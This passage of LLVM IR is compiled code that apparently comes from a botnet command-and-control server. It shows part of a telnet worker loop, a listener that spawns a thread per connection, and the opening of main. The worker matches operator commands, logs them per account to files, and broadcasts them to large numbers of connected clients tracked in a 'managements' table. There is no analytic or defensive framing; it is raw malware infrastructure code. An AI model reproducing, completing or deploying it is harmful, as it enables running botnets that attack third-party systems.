  %2091 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.123, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0))
  store %struct._IO_FILE* %2091, %struct._IO_FILE** %110, align 8
  %2092 = load %struct._IO_FILE*, %struct._IO_FILE** %110, align 8
  %2093 = load i32, i32* %6, align 4
  %2094 = sext i32 %2093 to i64
  %2095 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2094
  %2096 = getelementptr inbounds %struct.account, %struct.account* %2095, i32 0, i32 0
  %2097 = getelementptr inbounds [20 x i8], [20 x i8]* %2096, i64 0, i64 0
  %2098 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2099 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2092, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %2097, i8* %2098)
  %2100 = load %struct._IO_FILE*, %struct._IO_FILE** %110, align 8
  %2101 = call i32 @fclose(%struct._IO_FILE* %2100)
  br label %2321

2102:                                             ; preds = %2079
  %2103 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2104 = call i8* @strstr(i8* %2103, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.121, i64 0, i64 0)) #8
  %2105 = icmp ne i8* %2104, null
  br i1 %2105, label %2106, label %2125

2106:                                             ; preds = %2102
  %2107 = load i32, i32* %6, align 4
  %2108 = sext i32 %2107 to i64
  %2109 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2108
  %2110 = getelementptr inbounds %struct.account, %struct.account* %2109, i32 0, i32 0
  %2111 = getelementptr inbounds [20 x i8], [20 x i8]* %2110, i64 0, i64 0
  %2112 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2113 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %2111, i8* %2112)
  %2114 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.123, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0))
  store %struct._IO_FILE* %2114, %struct._IO_FILE** %111, align 8
  %2115 = load %struct._IO_FILE*, %struct._IO_FILE** %111, align 8
  %2116 = load i32, i32* %6, align 4
  %2117 = sext i32 %2116 to i64
  %2118 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2117
  %2119 = getelementptr inbounds %struct.account, %struct.account* %2118, i32 0, i32 0
  %2120 = getelementptr inbounds [20 x i8], [20 x i8]* %2119, i64 0, i64 0
  %2121 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2122 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2115, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %2120, i8* %2121)
  %2123 = load %struct._IO_FILE*, %struct._IO_FILE** %111, align 8
  %2124 = call i32 @fclose(%struct._IO_FILE* %2123)
  br label %2321

2125:                                             ; preds = %2102
  %2126 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2127 = call i8* @strstr(i8* %2126, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.121, i64 0, i64 0)) #8
  %2128 = icmp ne i8* %2127, null
  br i1 %2128, label %2129, label %2148

2129:                                             ; preds = %2125
  %2130 = load i32, i32* %6, align 4
  %2131 = sext i32 %2130 to i64
  %2132 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2131
  %2133 = getelementptr inbounds %struct.account, %struct.account* %2132, i32 0, i32 0
  %2134 = getelementptr inbounds [20 x i8], [20 x i8]* %2133, i64 0, i64 0
  %2135 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2136 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %2134, i8* %2135)
  %2137 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.123, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0))
  store %struct._IO_FILE* %2137, %struct._IO_FILE** %112, align 8
  %2138 = load %struct._IO_FILE*, %struct._IO_FILE** %112, align 8
  %2139 = load i32, i32* %6, align 4
  %2140 = sext i32 %2139 to i64
  %2141 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2140
  %2142 = getelementptr inbounds %struct.account, %struct.account* %2141, i32 0, i32 0
  %2143 = getelementptr inbounds [20 x i8], [20 x i8]* %2142, i64 0, i64 0
  %2144 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2145 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2138, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %2143, i8* %2144)
  %2146 = load %struct._IO_FILE*, %struct._IO_FILE** %112, align 8
  %2147 = call i32 @fclose(%struct._IO_FILE* %2146)
  br label %2321

2148:                                             ; preds = %2125
  %2149 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2150 = call i8* @strstr(i8* %2149, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.121, i64 0, i64 0)) #8
  %2151 = icmp ne i8* %2150, null
  br i1 %2151, label %2152, label %2171

2152:                                             ; preds = %2148
  %2153 = load i32, i32* %6, align 4
  %2154 = sext i32 %2153 to i64
  %2155 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2154
  %2156 = getelementptr inbounds %struct.account, %struct.account* %2155, i32 0, i32 0
  %2157 = getelementptr inbounds [20 x i8], [20 x i8]* %2156, i64 0, i64 0
  %2158 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2159 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %2157, i8* %2158)
  %2160 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.123, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0))
  store %struct._IO_FILE* %2160, %struct._IO_FILE** %113, align 8
  %2161 = load %struct._IO_FILE*, %struct._IO_FILE** %113, align 8
  %2162 = load i32, i32* %6, align 4
  %2163 = sext i32 %2162 to i64
  %2164 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2163
  %2165 = getelementptr inbounds %struct.account, %struct.account* %2164, i32 0, i32 0
  %2166 = getelementptr inbounds [20 x i8], [20 x i8]* %2165, i64 0, i64 0
  %2167 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2168 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2161, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %2166, i8* %2167)
  %2169 = load %struct._IO_FILE*, %struct._IO_FILE** %113, align 8
  %2170 = call i32 @fclose(%struct._IO_FILE* %2169)
  br label %2321

2171:                                             ; preds = %2148
  %2172 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2173 = call i8* @strstr(i8* %2172, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.121, i64 0, i64 0)) #8
  %2174 = icmp ne i8* %2173, null
  br i1 %2174, label %2175, label %2194

2175:                                             ; preds = %2171
  %2176 = load i32, i32* %6, align 4
  %2177 = sext i32 %2176 to i64
  %2178 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2177
  %2179 = getelementptr inbounds %struct.account, %struct.account* %2178, i32 0, i32 0
  %2180 = getelementptr inbounds [20 x i8], [20 x i8]* %2179, i64 0, i64 0
  %2181 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2182 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %2180, i8* %2181)
  %2183 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.123, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0))
  store %struct._IO_FILE* %2183, %struct._IO_FILE** %114, align 8
  %2184 = load %struct._IO_FILE*, %struct._IO_FILE** %114, align 8
  %2185 = load i32, i32* %6, align 4
  %2186 = sext i32 %2185 to i64
  %2187 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2186
  %2188 = getelementptr inbounds %struct.account, %struct.account* %2187, i32 0, i32 0
  %2189 = getelementptr inbounds [20 x i8], [20 x i8]* %2188, i64 0, i64 0
  %2190 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2191 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2184, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.122, i64 0, i64 0), i8* %2189, i8* %2190)
  %2192 = load %struct._IO_FILE*, %struct._IO_FILE** %114, align 8
  %2193 = call i32 @fclose(%struct._IO_FILE* %2192)
  br label %2321

2194:                                             ; preds = %2171
  %2195 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2196 = call i8* @strstr(i8* %2195, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.125, i64 0, i64 0)) #8
  %2197 = icmp ne i8* %2196, null
  br i1 %2197, label %2198, label %2217

2198:                                             ; preds = %2194
  %2199 = load i32, i32* %6, align 4
  %2200 = sext i32 %2199 to i64
  %2201 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2200
  %2202 = getelementptr inbounds %struct.account, %struct.account* %2201, i32 0, i32 0
  %2203 = getelementptr inbounds [20 x i8], [20 x i8]* %2202, i64 0, i64 0
  %2204 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2205 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.126, i64 0, i64 0), i8* %2203, i8* %2204)
  %2206 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.127, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0))
  store %struct._IO_FILE* %2206, %struct._IO_FILE** %115, align 8
  %2207 = load %struct._IO_FILE*, %struct._IO_FILE** %115, align 8
  %2208 = load i32, i32* %6, align 4
  %2209 = sext i32 %2208 to i64
  %2210 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2209
  %2211 = getelementptr inbounds %struct.account, %struct.account* %2210, i32 0, i32 0
  %2212 = getelementptr inbounds [20 x i8], [20 x i8]* %2211, i64 0, i64 0
  %2213 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2214 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2207, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.126, i64 0, i64 0), i8* %2212, i8* %2213)
  %2215 = load %struct._IO_FILE*, %struct._IO_FILE** %115, align 8
  %2216 = call i32 @fclose(%struct._IO_FILE* %2215)
  br label %2321

2217:                                             ; preds = %2194
  %2218 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2219 = call i8* @strstr(i8* %2218, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.128, i64 0, i64 0)) #8
  %2220 = icmp ne i8* %2219, null
  br i1 %2220, label %2221, label %2240

2221:                                             ; preds = %2217
  %2222 = load i32, i32* %6, align 4
  %2223 = sext i32 %2222 to i64
  %2224 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2223
  %2225 = getelementptr inbounds %struct.account, %struct.account* %2224, i32 0, i32 0
  %2226 = getelementptr inbounds [20 x i8], [20 x i8]* %2225, i64 0, i64 0
  %2227 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2228 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.126, i64 0, i64 0), i8* %2226, i8* %2227)
  %2229 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.127, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0))
  store %struct._IO_FILE* %2229, %struct._IO_FILE** %116, align 8
  %2230 = load %struct._IO_FILE*, %struct._IO_FILE** %116, align 8
  %2231 = load i32, i32* %6, align 4
  %2232 = sext i32 %2231 to i64
  %2233 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2232
  %2234 = getelementptr inbounds %struct.account, %struct.account* %2233, i32 0, i32 0
  %2235 = getelementptr inbounds [20 x i8], [20 x i8]* %2234, i64 0, i64 0
  %2236 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2237 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2230, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.126, i64 0, i64 0), i8* %2235, i8* %2236)
  %2238 = load %struct._IO_FILE*, %struct._IO_FILE** %116, align 8
  %2239 = call i32 @fclose(%struct._IO_FILE* %2238)
  br label %2321

2240:                                             ; preds = %2217
  %2241 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2242 = call i8* @strstr(i8* %2241, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.129, i64 0, i64 0)) #8
  %2243 = icmp ne i8* %2242, null
  br i1 %2243, label %2244, label %2263

2244:                                             ; preds = %2240
  %2245 = load i32, i32* %6, align 4
  %2246 = sext i32 %2245 to i64
  %2247 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2246
  %2248 = getelementptr inbounds %struct.account, %struct.account* %2247, i32 0, i32 0
  %2249 = getelementptr inbounds [20 x i8], [20 x i8]* %2248, i64 0, i64 0
  %2250 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2251 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.130, i64 0, i64 0), i8* %2249, i8* %2250)
  %2252 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.131, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0))
  store %struct._IO_FILE* %2252, %struct._IO_FILE** %117, align 8
  %2253 = load %struct._IO_FILE*, %struct._IO_FILE** %117, align 8
  %2254 = load i32, i32* %6, align 4
  %2255 = sext i32 %2254 to i64
  %2256 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2255
  %2257 = getelementptr inbounds %struct.account, %struct.account* %2256, i32 0, i32 0
  %2258 = getelementptr inbounds [20 x i8], [20 x i8]* %2257, i64 0, i64 0
  %2259 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2260 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2253, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.132, i64 0, i64 0), i8* %2258, i8* %2259)
  %2261 = load %struct._IO_FILE*, %struct._IO_FILE** %117, align 8
  %2262 = call i32 @fclose(%struct._IO_FILE* %2261)
  br label %2321

2263:                                             ; preds = %2240
  %2264 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2265 = call i8* @strstr(i8* %2264, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.133, i64 0, i64 0)) #8
  %2266 = icmp ne i8* %2265, null
  br i1 %2266, label %2267, label %2286

2267:                                             ; preds = %2263
  %2268 = load i32, i32* %6, align 4
  %2269 = sext i32 %2268 to i64
  %2270 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2269
  %2271 = getelementptr inbounds %struct.account, %struct.account* %2270, i32 0, i32 0
  %2272 = getelementptr inbounds [20 x i8], [20 x i8]* %2271, i64 0, i64 0
  %2273 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2274 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.130, i64 0, i64 0), i8* %2272, i8* %2273)
  %2275 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.134, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0))
  store %struct._IO_FILE* %2275, %struct._IO_FILE** %118, align 8
  %2276 = load %struct._IO_FILE*, %struct._IO_FILE** %118, align 8
  %2277 = load i32, i32* %6, align 4
  %2278 = sext i32 %2277 to i64
  %2279 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2278
  %2280 = getelementptr inbounds %struct.account, %struct.account* %2279, i32 0, i32 0
  %2281 = getelementptr inbounds [20 x i8], [20 x i8]* %2280, i64 0, i64 0
  %2282 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2283 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2276, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.126, i64 0, i64 0), i8* %2281, i8* %2282)
  %2284 = load %struct._IO_FILE*, %struct._IO_FILE** %118, align 8
  %2285 = call i32 @fclose(%struct._IO_FILE* %2284)
  br label %2321

2286:                                             ; preds = %2263
  %2287 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @trim(i8* %2287)
  %2288 = load i32, i32* %5, align 4
  %2289 = call i64 @send(i32 %2288, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.55, i64 0, i64 0), i64 24, i32 16384)
  %2290 = icmp eq i64 %2289, -1
  br i1 %2290, label %2291, label %2292

2291:                                             ; preds = %2286
  br label %2321

2292:                                             ; preds = %2286
  %2293 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2294 = call i64 @strlen(i8* %2293) #8
  %2295 = icmp eq i64 %2294, 0
  br i1 %2295, label %2296, label %2297

2296:                                             ; preds = %2292
  br label %519, !llvm.loop !19

2297:                                             ; preds = %2292
  %2298 = load i32, i32* %6, align 4
  %2299 = sext i32 %2298 to i64
  %2300 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2299
  %2301 = getelementptr inbounds %struct.account, %struct.account* %2300, i32 0, i32 0
  %2302 = getelementptr inbounds [20 x i8], [20 x i8]* %2301, i64 0, i64 0
  %2303 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2304 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.135, i64 0, i64 0), i8* %2302, i8* %2303)
  %2305 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.136, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0))
  store %struct._IO_FILE* %2305, %struct._IO_FILE** %119, align 8
  %2306 = load %struct._IO_FILE*, %struct._IO_FILE** %119, align 8
  %2307 = load i32, i32* %6, align 4
  %2308 = sext i32 %2307 to i64
  %2309 = getelementptr inbounds [50 x %struct.account], [50 x %struct.account]* @accounts, i64 0, i64 %2308
  %2310 = getelementptr inbounds %struct.account, %struct.account* %2309, i32 0, i32 0
  %2311 = getelementptr inbounds [20 x i8], [20 x i8]* %2310, i64 0, i64 0
  %2312 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2313 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %2306, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.135, i64 0, i64 0), i8* %2311, i8* %2312)
  %2314 = load %struct._IO_FILE*, %struct._IO_FILE** %119, align 8
  %2315 = call i32 @fclose(%struct._IO_FILE* %2314)
  %2316 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %2317 = load i32, i32* %5, align 4
  %2318 = getelementptr inbounds [5000 x i8], [5000 x i8]* %4, i64 0, i64 0
  call void @broadcast(i8* %2316, i32 %2317, i8* %2318)
  %2319 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %2319, i8 0, i64 2048, i1 false)
  br label %519, !llvm.loop !19

2320:                                             ; preds = %519
  br label %2321

2321:                                             ; preds = %2320, %2291, %2267, %2244, %2221, %2198, %2175, %2152, %2129, %2106, %2083, %2060, %2037, %2014, %1991, %1968, %1945, %1922, %1899, %1876, %1853, %1848, %1819, %1813, %1805, %1797, %1789, %1781, %1759, %1751, %1743, %1735, %1727, %1719, %1711, %1703, %1695, %1687, %1679, %1671, %1663, %1655, %1647, %1639, %1631, %1623, %1615, %1607, %1599, %1591, %1583, %1575, %1567, %1559, %1545, %1537, %1529, %1521, %1513, %1505, %1497, %1489, %1481, %1473, %1465, %1457, %1449, %1441, %1433, %1425, %1417, %1409, %1401, %1393, %1385, %1377, %1369, %1361, %1353, %1345, %1334, %1326, %1318, %1310, %1302, %1294, %1268, %1260, %1252, %1244, %1236, %1228, %1220, %1212, %1204, %1196, %1162, %1154, %1146, %1138, %1130, %1122, %1114, %1106, %1098, %1090, %1056, %1048, %1040, %1032, %1024, %1016, %1008, %1000, %992, %984, %976, %968, %960, %952, %944, %936, %890, %882, %874, %866, %858, %850, %842, %834, %826, %818, %810, %802, %794, %786, %778, %770, %510, %504, %496, %488, %480, %472, %464, %456, %448, %440, %432, %424, %416, %408, %400, %392, %384, %376, %368, %360, %352, %344, %336, %328, %320, %312, %242, %241, %236, %231, %226, %207, %202, %196, %191, %170, %164
  %2322 = load i32, i32* %5, align 4
  %2323 = sext i32 %2322 to i64
  %2324 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %2323
  %2325 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %2324, i32 0, i32 0
  store i32 0, i32* %2325, align 4
  %2326 = load i32, i32* %5, align 4
  %2327 = call i32 @close(i32 %2326)
  %2328 = load volatile i32, i32* @managesConnected, align 4
  %2329 = add nsw i32 %2328, -1
  store volatile i32 %2329, i32* @managesConnected, align 4
  br label %2330

2330:                                             ; preds = %2321, %1847, %725, %710, %695, %680, %665, %650, %635, %620, %605, %588, %573, %556, %539
  %2331 = load i8*, i8** %2, align 8
  ret i8* %2331
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @telnetListener(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %9 = call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %9, i32* %3, align 4
  %10 = load i32, i32* %3, align 4
  %11 = icmp slt i32 %10, 0
  br i1 %11, label %12, label %13

12:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.137, i64 0, i64 0))
  br label %13

13:                                               ; preds = %12, %1
  %14 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %14, i8 0, i64 16, i1 false)
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %15, align 4
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %17 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %16, i32 0, i32 0
  store i32 0, i32* %17, align 4
  %18 = load i32, i32* %2, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #10
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  %22 = load i32, i32* %3, align 4
  %23 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %24 = call i32 @bind(i32 %22, %struct.sockaddr* %23, i32 16) #9
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %27

26:                                               ; preds = %13
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.138, i64 0, i64 0))
  br label %27

27:                                               ; preds = %26, %13
  %28 = load i32, i32* %3, align 4
  %29 = call i32 @listen(i32 %28, i32 5) #9
  store i32 16, i32* %5, align 4
  br label %30

30:                                               ; preds = %27, %37
  %31 = load i32, i32* %3, align 4
  %32 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %33 = call i32 @accept(i32 %31, %struct.sockaddr* %32, i32* %5)
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp slt i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.139, i64 0, i64 0))
  br label %37

37:                                               ; preds = %36, %30
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = inttoptr i64 %39 to i8*
  %41 = call i32 @pthread_create(i64* %8, %union.pthread_attr_t* null, i8* (i8*)* @telnetWorker, i8* %40) #9
  br label %30
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #9
  %15 = load i32, i32* %5, align 4
  %16 = icmp ne i32 %15, 4
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.140, i64 0, i64 0), i8* %21)
  call void @exit(i32 1) #11
  unreachable

23:                                               ; preds = %3
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26) #8
  store i32 %27, i32* %10, align 4
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.141, i64 0, i64 0))
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.142, i64 0, i64 0))
  %30 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.143, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.144, i64 0, i64 0))
  store %struct._IO_FILE* %30, %struct._IO_FILE** @telFD, align 8
  %31 = load i8**, i8*** %6, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 2
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @atoi(i8* %33) #8
  store i32 %34, i32* %9, align 4
  %35 = load i8**, i8*** %6, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 1
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 @create_and_bind(i8* %37)
  store volatile i32 %38, i32* @listenFD, align 4
  %39 = load volatile i32, i32* @listenFD, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %23
  call void @abort() #11
